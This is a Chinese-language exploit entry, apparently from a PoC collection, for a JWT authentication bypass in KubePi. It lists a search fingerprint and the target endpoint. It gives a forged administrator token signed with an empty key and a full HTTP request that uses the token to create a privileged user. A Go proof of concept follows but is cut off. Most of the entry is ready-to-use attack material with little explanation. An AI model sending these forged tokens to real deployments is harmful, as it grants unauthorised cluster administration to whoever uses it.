# KubePi存在JWTtoken验证绕过漏洞

- **系统**：KubePi　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`"kubepi"`
- **请求**：`POST /kubepi/api/v1/users HTTP/1.1`

**请求体 / payload**
```
1.搭建最新版kubepi
sudo docker run --privileged -d --restart=unless-stopped -p 9982:80 1panel/kubepi
1. 使用空密钥生成jwttoken
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1chHBvcnRAZml0MmNsb3VkLmNvbSIs Imxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp 7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
1. 使用生成的钥匙创建用户
Host: 127.0.0.1:9982
Content-Length: 248
lang: zh-CN
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
{"apiVersion":"v1","kind":"User","name":"test","roles":\["Common User","Manage Image Registries","Manage Clusters","Manage RBAC"],"nickName":"tang","email":"test@qq.com","authenticate":{"password":"12345678@Test"},"mfa":{"enable":false,"secret":""}}
poc
package main
import (
"fmt"
"github.com/kataras/iris/v12/middleware/jwt"
"time"
)
var jwtMaxAge = 100000 \* time.Minute
type UserProfile struct {
Name                string              `json:"name"`
NickName            string         …（脚本共 2392 字，完整版见原文）
```